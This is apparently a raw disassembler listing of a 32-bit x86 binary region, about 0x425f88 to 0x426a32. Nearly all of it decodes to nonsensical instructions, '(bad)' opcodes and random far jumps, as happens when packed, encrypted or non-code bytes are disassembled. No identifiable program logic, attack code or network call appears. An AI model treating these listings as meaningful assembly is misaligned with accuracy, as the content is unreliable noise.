  425f88:	jno    0x425f9c
  425f8a:	test   DWORD PTR [ecx+0x32],edx
  425f8d:	xchg   edi,eax
  425f8e:	mov    esp,0x3ff66657
  425f93:	mov    esp,0xe98d8764
  425f98:	inc    esi
  425f99:	fidiv  DWORD PTR [eax+0x50]
  425f9c:	xor    al,dl
  425f9e:	adc    BYTE PTR [ecx-0x37],0x56
  425fa2:	lahf   
  425fa3:	jae    0x425f9a
  425fa5:	mov    ?,WORD PTR [eax+0x774363a1]
  425fab:	ins    DWORD PTR es:[edi],dx
  425fac:	dec    esp
  425fad:	lods   al,BYTE PTR ds:[esi]
  425fae:	pop    ss
  425faf:	mov    WORD PTR [edx+0x5dda4f71],ss
  425fb5:	xchg   esi,eax
  425fb6:	cmp    al,0x3
  425fb8:	pusha  
  425fb9:	sar    DWORD PTR [ebp-0xf52e8b4],cl
  425fbf:	dec    ebp
  425fc0:	jmp    0x425f5e
  425fc2:	mov    al,ds:0x4a6c5042
  425fc7:	push   es
  425fc8:	jle    0x425f4e
  425fca:	mov    ebx,0x916e4e63
  425fcf:	xor    DWORD PTR [edi+0x27],ecx
  425fd2:	out    dx,eax
  425fd3:	mov    ds:0xb97067f2,al
  425fd8:	add    BYTE PTR [edx-0x445344fd],al
  425fde:	cmp    cl,0x3f
  425fe1:	xchg   ebx,eax
  425fe2:	rcl    BYTE PTR [bx+si+0x1dd2],cl
  425fe7:	xlat   BYTE PTR ds:[ebx]
  425fe8:	mov    esp,0xf99bd3ed
  425fed:	push   0x63
  425fef:	dec    edi
  425ff0:	in     al,0xc1
  425ff2:	push   edi
  425ff3:	pop    ecx
  425ff4:	dec    ebp
  425ff5:	repnz repnz scas al,BYTE PTR es:[edi]
  425ff8:	out    dx,eax
  425ff9:	or     eax,0x3a4eb9f3
  425ffe:	shl    BYTE PTR [esp+ebp*8+0x6b],0xe1
  426003:	pop    esp
  426004:	in     eax,dx
  426005:	test   al,0x8f
  426007:	xchg   DWORD PTR [edx-0x76639cbd],ecx
  42600d:	push   0xb1c9a00a
  426012:	inc    eax
  426013:	cmp    eax,0x80d514fc
  426018:	mov    esi,0xbf48186f
  42601d:	ins    BYTE PTR es:[edi],dx
  42601e:	sbb    DWORD PTR [esi-0x70],edx
  426021:	mov    bh,0x2a
  426023:	repz jne 0x42602b
  426026:	mov    ah,dh
  426028:	gs sbb eax,0x11aeeef6
  42602e:	adc    eax,0x6683a86b
  426033:	cld    
  426034:	or     BYTE PTR [eax-0x2a824dd],0x3d
  42603b:	dec    esp
  42603c:	or     BYTE PTR [eax],cl
  42603e:	(bad)  
  42603f:	(bad)  
  426040:	repnz ds xor ah,dl
  426044:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426045:	and    al,0x3f
  426047:	imul   edi,DWORD PTR [ecx-0x3a],0xffffffca
  42604b:	retf   
  42604c:	iret   
  42604d:	and    ah,BYTE PTR [ebx]
  42604f:	cld    
  426050:	adc    eax,0x8c960c00
  426055:	loope  0x426022
  426057:	sub    cl,ch
  426059:	sub    DWORD PTR [ebp-0x19aa8f7a],eax
  42605f:	rol    BYTE PTR [edi],cl
  426061:	jne    0x426048
  426063:	mov    ds:0xe784ff6f,al
  426068:	xor    ch,BYTE PTR [ecx]
  42606a:	xchg   esp,eax
  42606b:	xchg   ah,al
  42606d:	inc    BYTE PTR [eax]
	...
  4260d3:	add    BYTE PTR [eax],al
  4260d5:	add    BYTE PTR [ecx],bh
  4260d7:	cwde   
  4260d8:	or     eax,DWORD PTR [esi]
  4260da:	stos   DWORD PTR es:[edi],eax
  4260db:	xchg   edi,eax
  4260dc:	cmp    eax,0x304575bf
  4260e1:	in     al,dx
  4260e2:	icebp  
  4260e3:	pop    edi
  4260e4:	inc    esp
  4260e5:	dec    ecx
  4260e6:	addr16 cwde 
  4260e8:	add    DWORD PTR [eax],eax
  4260ea:	add    BYTE PTR [ecx],al
  4260ec:	add    BYTE PTR [eax],al
  4260ee:	sub    edi,DWORD PTR [esi-0x6312fd5f]
  4260f4:	cli    
  4260f5:	mov    dl,0xdb
  4260f7:	pop    es
  4260f8:	push   ebx
  4260f9:	mov    dl,0x6e
  4260fb:	js     0x426140
  4260fd:	mov    esp,esp
  4260ff:	mov    ah,0xa6
  426101:	sbb    ah,ah
  426103:	into   
  426104:	xchg   DWORD PTR [esi-0x1f],ebx
  426107:	in     eax,0x6f
  426109:	cmp    al,0x19
  42610b:	or     eax,0xdc10cac8
  426110:	and    DWORD PTR [eax+0x41],0xffffffc5
  426114:	xchg   esp,eax
  426115:	jno    0x4260d9
  426117:	mov    al,0x3f
  426119:	xor    BYTE PTR [ebx],bh
  42611b:	dec    ebp
  42611c:	add    eax,0xaf13fb01
  426121:	or     cl,dh
  426123:	jge    0x426178
  426125:	arpl   WORD PTR [edx-0x26],bp
  426128:	pop    eax
  426129:	cs enter 0x38d,0x36
  42612e:	sahf   
  42612f:	pop    ebx
  426130:	daa    
  426131:	mov    al,ds:0x75649ee1
  426136:	mov    ch,0xe7
  426138:	hlt    
  426139:	stc    
  42613a:	rcl    DWORD PTR [edx+0x40d562b7],0xa2
  426141:	add    ah,dl
  426143:	mov    WORD PTR [ecx+0x6f162449],gs
  426149:	push   es
  42614a:	push   edx
  42614b:	mov    ds:0xd796de9b,al
  426150:	sti    
  426151:	mov    dh,0xa1
  426153:	xchg   DWORD PTR [ecx],esp
  426155:	in     al,dx
  426156:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426157:	mov    eax,0x31836553
  42615c:	loopne 0x4260ec
  42615e:	xor    eax,0xfcedb560
  426163:	das    
  426164:	push   0x40
  426166:	pop    edx
  426167:	add    BYTE PTR [edi+0x399cadba],ch
  42616d:	ss pop es
  42616f:	add    eax,0xde99ac88
  426174:	pop    esp
  426175:	pop    eax
  426176:	mov    ebp,0x9ea1e306
  42617b:	repz popf 
  42617d:	add    ah,ah
  42617f:	adc    eax,DWORD PTR [edi]
  426181:	cmp    eax,ebx
  426183:	sbb    al,BYTE PTR [eax+0x57]
  426186:	shl    ebx,1
  426188:	xchg   BYTE PTR [ebp-0x4ef65b10],dl
  42618e:	jl     0x42615a
  426190:	gs into 
  426192:	jnp    0x4261a8
  426194:	icebp  
  426195:	scas   al,BYTE PTR es:[edi]
  426196:	and    eax,DWORD PTR [ebx]
  426198:	js     0x42619c
  42619a:	inc    ebp
  42619b:	xor    BYTE PTR [ebp-0x704c19bb],ch
  4261a1:	outs   dx,DWORD PTR ds:[esi]
  4261a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261a3:	dec    esp
  4261a4:	(bad)  
  4261a5:	into   
  4261a6:	adc    ecx,esp
  4261a8:	mov    gs,WORD PTR [esp+edx*2+0x6d]
  4261ac:	iret   
  4261ad:	ret    0x4d94
  4261b0:	(bad)  
  4261b1:	std    
  4261b2:	cmp    BYTE PTR [ebx+0xd],al
  4261b5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4261b6:	js     0x42621e
  4261b8:	xor    edx,DWORD PTR [ebx+0x5b3afb4]
  4261be:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4261bf:	daa    
  4261c0:	out    dx,eax
  4261c1:	outs   dx,DWORD PTR ds:[esi]
  4261c2:	std    
  4261c3:	aad    0x3e
  4261c5:	xor    BYTE PTR [ecx],0x1d
  4261c8:	leave  
  4261c9:	mov    dl,0x6d
  4261cb:	call   0x8d58ad64
  4261d0:	mov    edi,0x684dd62a
  4261d5:	jle    0x42621a
  4261d7:	xchg   BYTE PTR [edi+0x70197d7b],al
  4261dd:	add    eax,0xab4d11c0
  4261e2:	enter  0x86af,0x41
  4261e6:	or     bl,BYTE PTR [edi-0x62f859e8]
  4261ec:	mov    bh,0x7e
	...
  426256:	fwait
  426257:	and    DWORD PTR [edi],ecx
  426259:	popa   
  42625a:	mov    edi,0xb7fbff6f
  42625f:	xor    DWORD PTR [ecx+0x697b27],0x78
  426266:	addr16 cdq 
  426268:	add    DWORD PTR [eax],eax
  42626a:	add    BYTE PTR [ecx],al
  42626c:	add    BYTE PTR [eax],al
  42626e:	xor    al,0x5e
  426270:	shl    BYTE PTR [ebx+0x18c0c7f5],1
  426276:	mov    edi,DWORD PTR ds:0x37d4b57a
  42627c:	jp     0x426279
  42627e:	out    0x5c,eax
  426280:	jmp    0x4262c8
  426282:	sbb    al,0x6
  426284:	adc    ebx,edx
  426286:	pop    esp
  426287:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426288:	mov    ebx,0xac133503
  42628d:	dec    esp
  42628e:	sub    eax,0xffffffb1
  426291:	adc    al,0x6
  426293:	(bad)  
  426294:	xchg   ecx,eax
  426295:	nop
  426296:	ds xchg ebp,eax
  426298:	call   0x1fb88729
  42629d:	rcl    al,cl
  42629f:	sbb    bl,BYTE PTR [edi+ebx*4+0x10]
  4262a3:	sub    ah,dh
  4262a5:	or     DWORD PTR [eax+0x203bad57],esp
  4262ab:	fst    st(4)
  4262ad:	shr    BYTE PTR [ebp+0x43],cl
  4262b0:	push   edi
  4262b1:	inc    edx
  4262b2:	sub    ah,BYTE PTR [edx]
  4262b4:	or     al,0x90
  4262b6:	and    cl,BYTE PTR [esi]
  4262b8:	or     DWORD PTR [ebp-0x99e5dff],edx
  4262be:	dec    esp
  4262bf:	je     0x426287
  4262c1:	push   esi
  4262c2:	push   es
  4262c3:	xor    BYTE PTR ds:0x5ef912c,ch
  4262c9:	fwait
  4262ca:	(bad)  
  4262cb:	pop    eax
  4262cc:	mov    ss,WORD PTR [ebp+0x3e70c9f7]
  4262d2:	mov    dh,0x9c
  4262d4:	jb     0x4262e0
  4262d6:	push   eax
  4262d7:	xlat   BYTE PTR ds:[ebx]
  4262d8:	les    ebx,FWORD PTR gs:[ebx]
  4262db:	in     eax,0x78
  4262dd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4262de:	or     eax,0xb1bc2d2e
  4262e3:	nop
  4262e4:	mov    ah,0x1
  4262e6:	xor    dl,BYTE PTR [edi+0x45]
  4262e9:	adc    BYTE PTR [edi+ecx*8],ch
  4262ec:	adc    al,0x42
  4262ee:	cmc    
  4262ef:	push   0x1af38f75
  4262f4:	gs xchg esp,eax
  4262f6:	push   0x6e
  4262f8:	(bad)  
  4262f9:	lods   al,BYTE PTR ds:[esi]
  4262fa:	jno    0xd3abc4e9
  426300:	and    dl,BYTE PTR [eax-0x475a6a81]
  426306:	mul    DWORD PTR [ecx+0x7]
  426309:	loopne 0x426379
  42630b:	xchg   ebp,eax
  42630c:	test   al,0xdd
  42630e:	push   es
  42630f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426310:	xor    dl,cl
  426312:	fldenv [eax-0x348d2659]
  426318:	lea    edx,[eax+0x7]
  42631b:	(bad)  
  42631c:	iret   
  42631d:	push   edi
  42631e:	test   DWORD PTR [edx+0x6db49d44],ebp
  426324:	pop    edi
  426325:	ins    BYTE PTR es:[edi],dx
  426326:	(bad)  
  42632a:	iret   
  42632b:	retf   0xaace
  42632e:	mov    eax,0xe2fa8140
  426333:	popf   
  426334:	fisub  DWORD PTR ss:[ebp-0x6c611f11]
  42633b:	fdivr  st,st(3)
  42633d:	mov    dh,0xe4
  42633f:	(bad)
  426343:	add    eax,edx
  426345:	dec    eax
  426346:	jg     0x4262ce
  426348:	fimul  DWORD PTR [edx-0x2b6567ce]
  42634e:	push   eax
  42634f:	push   eax
  426350:	push   ebx
  426351:	push   0x9e7da9aa
  426356:	pop    esi
  426357:	nop
  426358:	mov    ebp,0x8063601c
  42635d:	dec    esp
  42635e:	jmp    0x4685:0x258be396
  426365:	push   eax
  426366:	push   ecx
  426367:	cmp    eax,0x4ecfa108
  42636c:	and    bh,ch
	...
  4263d6:	push   esp
  4263d7:	and    eax,0xeefd4e8d
  4263dc:	xlat   BYTE PTR ds:[ebx]
  4263dd:	aas    
  4263de:	dec    ecx
  4263df:	sbb    esi,edi
  4263e1:	or     eax,0x29748c28
  4263e6:	addr16 call 0x0:0x1000001
  4263ee:	mov    ecx,0xe39c41e9
  4263f3:	loop   0x42642d
  4263f5:	inc    esi
  4263f6:	push   es
  4263f7:	xor    al,0x41
  4263f9:	mov    esi,0xdb8ff46f
  4263fe:	ret    0xe0fe
  426401:	push   0xb05e5db6
  426406:	imul   ebp,DWORD PTR [esi],0xffffff8d
  426409:	jae    0x42647f
  42640b:	fist   WORD PTR [ecx]
  42640d:	enter  0x6f42,0x1c
  426411:	push   ss
  426412:	or     al,0x52
  426414:	fwait
  426415:	(bad)  
  426419:	mov    dl,0xa1
  42641b:	cmp    bh,BYTE PTR [ebp+eiz*4-0x14]
  42641f:	ss repz lock je 0x4263e9
  426424:	fcomp  QWORD PTR [ebx-0x3a8bee71]
  42642a:	add    eax,0xfdcd6729
  42642f:	lods   al,BYTE PTR ds:[esi]
  426430:	clc    
  426431:	out    dx,al
  426432:	push   ecx
  426433:	inc    ebx
  426434:	mov    ch,0xb6
  426436:	cmc    
  426437:	sbb    dh,dl
  426439:	rcl    DWORD PTR [ecx-0x7091079d],1
  42643f:	inc    ecx
  426440:	sahf   
  426441:	jo     0x4263dd
  426443:	add    eax,0xb91f05bf
  426448:	out    0x55,eax
  42644a:	adc    ebx,DWORD PTR [ebx]
  42644c:	call   0x56177408
  426451:	add    esp,DWORD PTR ds:0xa910683d
  426457:	pop    eax
  426458:	mov    eax,0x95c0e6db
  42645d:	icebp  
  42645e:	sbb    DWORD PTR [edi+edx*2],esp
  426461:	or     cl,BYTE PTR [eax]
  426463:	aaa    
  426464:	pop    eax
  426465:	mov    ebx,0xf03cf9b8
  42646a:	lock xchg edi,eax
  42646c:	jo     0x426436
  42646e:	adc    dl,BYTE PTR [ecx+0x153c1f15]
  426474:	pop    DWORD PTR [eax+ecx*1+0x52]
  426478:	adc    edx,DWORD PTR [ebp+0x1c]
  42647b:	fild   WORD PTR [ebx-0x2781dbee]
  426481:	ret    0x80cb
  426484:	stos   BYTE PTR es:[edi],al
  426485:	aas    
  426486:	sti    
  426487:	mov    edx,0xa4c2e0c9
  42648c:	mov    ch,BYTE PTR ds:0x4ce7e683
  426492:	lods   eax,DWORD PTR ds:[esi]
  426493:	inc    edi
  426494:	fsubr  st(7),st
  426496:	inc    edx
  426497:	pop    eax
  426498:	mov    ds,WORD PTR [esi]
  42649a:	and    esi,ecx
  42649c:	jb     0x426472
  42649e:	xchg   ecx,eax
  42649f:	cmp    edi,DWORD PTR [edi]
  4264a1:	loopne 0x4264a3
  4264a3:	lods   eax,DWORD PTR ds:[esi]
  4264a4:	mov    ch,0x4d
  4264a6:	stos   BYTE PTR es:[edi],al
  4264a7:	sub    DWORD PTR [edi+eiz*2-0x23],ebx
  4264ab:	(bad)  
  4264ac:	mov    DWORD PTR ds:0xc068c5f4,eax
  4264b2:	std    
  4264b3:	fist   WORD PTR [ebp-0x1364712d]
  4264b9:	dec    ebx
  4264ba:	adc    ecx,eax
  4264bc:	jmp    0x426534
  4264be:	bound  edx,QWORD PTR [edx-0x243229f9]
  4264c4:	xor    BYTE PTR [ecx+0xad015da],bh
  4264ca:	jbe    0x4264e6
  4264cc:	mov    ecx,0x3ba7d92a
  4264d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4264d2:	add    cl,al
  4264d4:	push   edi
  4264d5:	test   DWORD PTR [ecx-0xf],ecx
  4264d8:	fnstenv [eax]
  4264da:	mov    edx,0xb32afd0f
  4264df:	(bad)  
  4264e0:	fwait
  4264e1:	mov    dh,0x58
  4264e3:	and    BYTE PTR [edi],0xa8
  4264e6:	xchg   BYTE PTR [ebx+0x30e9bc1a],ch
  4264ec:	add    BYTE PTR [ecx+0x0],dh
	...
  426553:	add    BYTE PTR [eax],al
  426555:	add    BYTE PTR [ecx+0x6f],ch
  426558:	mov    BYTE PTR [eax],cl
  42655a:	mov    gs,edi
  42655c:	jmp    0x8abb74d0
  426561:	test   DWORD PTR [ebx+0x6768347c],edx
  426567:	fwait
  426568:	add    DWORD PTR [eax],eax
  42656a:	add    BYTE PTR [ecx],al
  42656c:	add    BYTE PTR [eax],al
  42656e:	mov    bh,0xae
  426570:	jae    0x42658d
  426572:	hlt    
  426573:	mov    esi,0x45024a9d
  426578:	push   ds
  426579:	loop   0x426519
  42657b:	pop    edi
  42657c:	mov    bh,0x51
  42657e:	jecxz  0x42659a
  426580:	adc    al,0x13
  426582:	je     0x4265c5
  426584:	pop    ss
  426585:	pop    ecx
  426586:	aad    0xfe
  426588:	push   eax
  426589:	adc    BYTE PTR [ebx+0x47481a16],bl
  42658f:	mov    edx,ecx
  426591:	inc    ebp
  426592:	cli    
  426593:	pop    es
  426594:	mov    bh,0x12
  426596:	fistp  QWORD PTR [ecx+0x486eb645]
  42659c:	sbb    BYTE PTR [edx+eiz*1],dl
  42659f:	(bad)  
  4265a1:	jbe    0x4265ed
  4265a3:	pushf  
  4265a4:	out    0x48,eax
  4265a6:	pop    esi
  4265a7:	sub    DWORD PTR [eax+ebp*8],0x443414a6
  4265ae:	scas   al,BYTE PTR es:[edi]
  4265af:	xor    BYTE PTR [esi+0x260a95e7],ch
  4265b5:	dec    eax
  4265b6:	mov    ecx,DWORD PTR [eax]
  4265b8:	dec    esi
  4265b9:	inc    ebp
  4265ba:	aas    
  4265bb:	pop    ds
  4265bc:	cli    
  4265bd:	cmp    BYTE PTR [eax+0x12],ch
  4265c0:	(bad)  
  4265c1:	in     eax,0x9b
  4265c3:	xor    ah,BYTE PTR [esi-0x39615354]
  4265c9:	sbb    ah,BYTE PTR [edi+esi*8]
  4265cc:	sbb    dh,bl
  4265ce:	mov    esp,0x40237c1
  4265d3:	mov    bl,0x6b
  4265d5:	push   ebx
  4265d6:	stc    
  4265d7:	mov    eax,ebx
  4265d9:	add    BYTE PTR [ebx],bh
  4265db:	adc    eax,0x640bf9ad
  4265e0:	or     BYTE PTR [esi+0x5451689],bh
  4265e6:	push   ebx
  4265e7:	out    dx,al
  4265e8:	test   DWORD PTR [ebp+0x36],edx
  4265eb:	popa   
  4265ec:	xchg   ebx,eax
  4265ed:	repz push cs
  4265ef:	fdivp  st(5),st
  4265f1:	neg    DWORD PTR [edi-0x28d16651]
  4265f7:	lods   al,BYTE PTR ds:[esi]
  4265f8:	fcmovb st,st(0)
  4265fa:	rcr    DWORD PTR [eax],cl
  4265fc:	push   edx
  4265fd:	outs   dx,BYTE PTR ds:[esi]
  4265fe:	inc    ebp
  4265ff:	cmp    BYTE PTR [eax+0x65],cl
  426602:	cmp    BYTE PTR [edi],ah
  426604:	(bad)  
  426605:	sti    
  426606:	sbb    eax,0x513c6c2
  42660b:	jno    0x426656
  42660d:	ins    DWORD PTR es:[edi],dx
  42660e:	test   eax,0x7c2172ca
  426613:	xchg   edx,eax
  426614:	adc    BYTE PTR [ecx-0x5e1f8bc8],dh
  42661a:	mov    ch,dh
  42661c:	fsubr  st,st(0)
  42661e:	popf   
  42661f:	mov    ah,0xc4
  426621:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426622:	hlt    
  426623:	cs jmp 0x4265de
  426626:	mov    WORD PTR [esi-0x5a3c3389],ss
  42662c:	or     eax,0x131285c
  426631:	push   0xffffff8e
  426633:	call   0x55b94450
  426638:	fstp   TBYTE PTR [ebp-0x7bc10d57]
  42663e:	add    bl,BYTE PTR [edi]
  426640:	push   cs
  426641:	call   0xe691eb3f
  426646:	add    eax,0xae3d49ff
  42664b:	or     bh,BYTE PTR [eax-0x7b]
  42664e:	repnz inc esp
  426650:	mov    ds:0xc1ae2b15,eax
  426655:	or     eax,0xce91eb8d
  42665a:	cdq    
  42665b:	scas   eax,DWORD PTR es:[edi]
  42665c:	and    al,al
  42665e:	add    al,0xb0
  426660:	fisub  WORD PTR ss:[edx]
  426663:	add    DWORD PTR [ecx+edx*8-0x14],eax
  426667:	jns    0x4266ac
  426669:	test   eax,0x5d045e44
	...
  4266d6:	adc    cl,bl
  4266d8:	sbb    DWORD PTR [edx],0xcb9b5ad9
  4266de:	pop    DWORD PTR [edi-0x4376925c]
  4266e4:	inc    ebp
  4266e5:	pop    edx
  4266e6:	addr16 pushf 
  4266e8:	add    DWORD PTR [eax],eax
  4266ea:	add    BYTE PTR [ecx],al
  4266ec:	add    BYTE PTR [eax],al
  4266ee:	sub    eax,0xa632a97b
  4266f3:	repz sub DWORD PTR [ecx+0x27],esi
  4266f7:	in     al,dx
  4266f8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266f9:	nop    DWORD PTR [ecx+ecx*1]
  4266fd:	jne    0x426729
  4266ff:	push   edx
  426700:	push   esp
  426701:	mov    BYTE PTR ds:0x63a08402,cl
  426707:	cmp    DWORD PTR [esi],ebp
  426709:	imul   ebp,DWORD PTR [bx+di],0x6e
  42670d:	lds    edi,FWORD PTR [edi]
  42670f:	xor    eax,0xb6e4f493
  426714:	mov    dh,0xa8
  426716:	out    0x20,al
  426718:	lds    esi,FWORD PTR [ecx+0x6a]
  42671b:	ss inc edx
  42671d:	nop
  42671e:	pop    esp
  42671f:	(bad)  
  426720:	scas   eax,DWORD PTR es:[edi]
  426721:	xchg   ecx,eax
  426722:	pop    ss
  426723:	jmp    0x426761
  426725:	add    ecx,DWORD PTR [eax+0x2c]
  426728:	mov    bh,0xb0
  42672a:	(bad)  
  42672b:	popf   
  42672c:	add    ah,cl
  42672e:	jmp    0x82f6:0x57cf4899
  426735:	data16 clc 
  426737:	mov    BYTE PTR [edx-0x73357fe9],dh
  42673d:	or     BYTE PTR [edx-0x1d3e8075],ch
  426743:	call   0x6c61b106
  426748:	push   ecx
  426749:	push   ebx
  42674a:	cmp    eax,0x82a11462
  42674f:	cwde   
  426750:	dec    edi
  426751:	jmp    0x698ff277
  426756:	imul   ebx,edi,0x1a
  426759:	mov    DWORD PTR [edx+edi*4],eax
  42675c:	dec    eax
  42675d:	lock xor ebp,DWORD PTR [esi]
  426760:	int    0xfb
  426762:	mov    dl,0xa6
  426764:	inc    ebp
  426765:	inc    edx
  426766:	push   es
  426767:	idiv   DWORD PTR [esi-0x57]
  42676a:	arpl   WORD PTR [ecx-0x393fc2fc],ax
  426770:	mov    cl,0xcd
  426772:	fcomp  QWORD PTR [ebp+0x51]
  426775:	xchg   ecx,eax
  426776:	sub    edx,DWORD PTR [eax+0x3c]
  426779:	push   es
  42677a:	aas    
  42677b:	es ds fdivr st(6),st
  42677f:	fiadd  DWORD PTR [ecx-0x17f2df8b]
  426785:	jns    0x4267e9
  426787:	outs   dx,DWORD PTR ds:[esi]
  426788:	cmp    ecx,DWORD PTR [edi+0x19]
  42678b:	loop   0x4267f2
  42678d:	lds    esp,FWORD PTR [ebx-0x55]
  426790:	pop    ebx
  426791:	cmp    cl,BYTE PTR [ebx]
  426793:	leave  
  426794:	stos   DWORD PTR es:[edi],eax
  426795:	ins    DWORD PTR es:[edi],dx
  426796:	addr16 out dx,eax
  426798:	jmp    0x42676e
  42679a:	xor    eax,0xc018c6b9
  42679f:	dec    eax
  4267a0:	fld    TBYTE PTR [ecx-0x5e]
  4267a3:	enter  0xa344,0x87
  4267a7:	cs stos DWORD PTR es:[edi],eax
  4267a9:	mov    edx,0xc5511752
  4267ae:	xor    eax,0xf27b46c2
  4267b3:	out    dx,al
  4267b4:	push   0x6a
  4267b6:	add    al,0xdc
  4267b8:	popa   
  4267b9:	(bad)  
  4267ba:	mov    edx,0xe5e9ef79
  4267bf:	repz xchg ecx,eax
  4267c1:	es jns 0x426756
  4267c4:	aad    0xdb
  4267c6:	fiadd  WORD PTR [ebp-0x7c8a8c4c]
  4267cc:	loop   0x42681d
  4267ce:	pop    ds
  4267cf:	(bad)  
  4267d0:	fucomp st(6)
  4267d2:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4267d3:	cmp    eax,0x225456ee
  4267d8:	popf   
  4267d9:	jg     0x4267ec
  4267db:	clc    
  4267dc:	mov    al,ds:0xb1eebe25
  4267e1:	out    0x92,eax
  4267e3:	push   ebp
  4267e4:	dec    eax
  4267e5:	pop    es
  4267e6:	sub    ecx,DWORD PTR [edx+edx*8-0x7a]
  4267ea:	retf   
  4267eb:	gs sub eax,0xef
	...
  426855:	add    BYTE PTR [eax-0xd53173],bh
  42685b:	imul   edi,esp,0xffffff9f
  42685e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42685f:	and    dh,0xca
  426862:	sub    eax,0x671d7653
  426867:	popf   
  426868:	add    DWORD PTR [eax],eax
  42686a:	add    BYTE PTR [ecx],al
  42686c:	add    BYTE PTR [eax],al
  42686e:	leave  
  42686f:	add    DWORD PTR [ecx-0x2a],ecx
  426872:	sub    eax,0xf1d4e45e
  426877:	push   eax
  426878:	pushf  
  426879:	pop    esp
  42687a:	(bad)  
  42687b:	hlt    
  42687c:	add    edx,DWORD PTR [edx]
  42687e:	(bad)  
  42687f:	clc    
  426880:	scas   eax,DWORD PTR es:[edi]
  426881:	mov    al,ds:0x4226f560
  426886:	dec    esp
  426887:	dec    ebp
  426888:	pushf  
  426889:	or     eax,0xa9db3720
  42688e:	fisub  WORD PTR [ecx-0x3c111e1a]
  426894:	iret   
  426895:	xchg   edx,ebx
  426897:	adc    cl,BYTE PTR [ebx]
  426899:	fld    TBYTE PTR [ecx-0xd1e17cd]
  42689f:	jbe    0x4268dc
  4268a1:	or     cl,ah
  4268a3:	call   FWORD PTR [edi+0x7b]
  4268a6:	mov    DWORD PTR [esi-0x14],eax
  4268a9:	xchg   edi,eax
  4268aa:	sub    al,0x68
  4268ac:	fucomp st(2)
  4268ae:	imul   ecx,DWORD PTR [di-0x4d0c],0xfffffffd
  4268b4:	(bad)  
  4268b5:	cli    
  4268b6:	scas   eax,DWORD PTR es:[edi]
  4268b7:	adc    DWORD PTR [ecx],edi
  4268b9:	loop   0x426909
  4268bb:	xchg   esp,eax
  4268bc:	pop    edx
  4268bd:	mov    ds:0xb82cc7ef,eax
  4268c2:	xor    dl,BYTE PTR [edx+0x10c0c8f9]
  4268c8:	dec    edx
  4268c9:	or     dh,dl
  4268cb:	cmc    
  4268cc:	mov    dl,0x2
  4268ce:	dec    esp
  4268cf:	fisttp QWORD PTR [ecx-0x53]
  4268d2:	push   0x1a06685b
  4268d7:	jb     0x4268a4
  4268d9:	pop    esi
  4268da:	mov    esi,0xb46463bb
  4268df:	pop    edx
  4268e0:	add    ch,cl
  4268e2:	fdiv   QWORD PTR [ebp+eax*2-0x10]
  4268e6:	add    esi,DWORD PTR [edx+ebp*2]
  4268e9:	adc    DWORD PTR [eax+0x57d89fb9],edx
  4268ef:	sahf   
  4268f0:	xchg   ebx,eax
  4268f1:	inc    esi
  4268f2:	xor    edi,0xffffffa5
  4268f5:	push   0xffffff82
  4268f7:	cmp    DWORD PTR ds:0xec7d692a,0x27
  4268fe:	adc    edx,ecx
  426900:	jno    0x4268ba
  426902:	inc    esi
  426903:	mov    ds:0x851fd7b5,al
  426908:	lods   eax,DWORD PTR ds:[esi]
  426909:	repnz jmp 0x815c:0xa62fcf
  426911:	push   ecx
  426912:	cmc    
  426913:	aas    
  426914:	paddb  mm2,QWORD PTR [edi+0x69]
  426918:	push   esp
  426919:	mov    WORD PTR [ebp+ebp*8+0x26],cs
  42691d:	ins    DWORD PTR es:[edi],dx
  42691e:	mov    eax,0x81e2f5cd
  426923:	out    0xd0,eax
  426925:	ret    0xf631
  426928:	add    BYTE PTR [eax-0x3c],al
  42692b:	or     DWORD PTR [edx-0x42],esi
  42692e:	jmp    0x4268ff
  426930:	les    esp,FWORD PTR [ebp+0x59]
  426933:	xchg   ebx,eax
  426934:	loope  0x426961
  426936:	push   ss
  426937:	xor    DWORD PTR [edx],0xa937377e
  42693d:	dec    esp
  42693e:	js     0x4268d9
  426940:	and    bh,BYTE PTR [edi+0x14ecee11]
  426946:	lds    ecx,FWORD PTR [edi+eiz*8+0x59]
  42694a:	mov    al,ds:0x5e9dcda0
  42694f:	je     0x426939
  426951:	cwde   
  426952:	lods   eax,DWORD PTR ds:[esi]
  426953:	sub    DWORD PTR [esi],0xfffffff2
  426956:	mov    esi,0x587247c8
  42695b:	mov    cl,0x9e
  42695d:	push   edx
  42695e:	fbld   TBYTE PTR [edi+0x5497e69e]
  426964:	(bad)  
  426965:	mov    al,0x2f
  426967:	sub    al,0xe4
  426969:	ja     0x426978
  42696b:	fmul   DWORD PTR [edi+0x7f]
	...
  4269d5:	add    BYTE PTR [esi+ecx*2+0x7fff7d7d],cl
  4269dc:	mov    edi,?
  4269de:	sub    ebp,esp
  4269e0:	lahf   
  4269e1:	mov    edx,ecx
  4269e3:	cmp    eax,0x9e673ef9
  4269e8:	add    DWORD PTR [eax],eax
  4269ea:	add    BYTE PTR [ecx],al
  4269ec:	add    BYTE PTR [eax],al
  4269ee:	es inc eax
  4269f0:	mov    esi,0xa0946517
  4269f5:	test   al,0x58
  4269f7:	cld    
  4269f8:	mov    ch,0x37
  4269fa:	arpl   WORD PTR [esi+0x45],dx
  4269fd:	das    
  4269fe:	lock dec ecx
  426a00:	add    ah,BYTE PTR [edx-0x7e7cfe71]
  426a06:	xchg   ebx,eax
  426a07:	rol    BYTE PTR [esi+eiz*4-0x18ce4b76],cl
  426a0e:	xchg   esi,eax
  426a0f:	(bad)  
  426a10:	jl     0x426a12
  426a12:	pop    ebx
  426a13:	dec    esp
  426a14:	cmp    edx,0xe4eb6fdb
  426a1a:	xchg   DWORD PTR [ebx+ebx*2-0x6c],edi
  426a1e:	jmp    0x2fa0:0x7d41f6e
  426a25:	adc    esi,DWORD PTR [esi+0x26f24132]
  426a2b:	lods   al,BYTE PTR fs:[esi]
  426a2d:	mov    eax,ds:0xc70ddc88
  426a32:	add    DWORD PTR [ebp+0x64],ebp
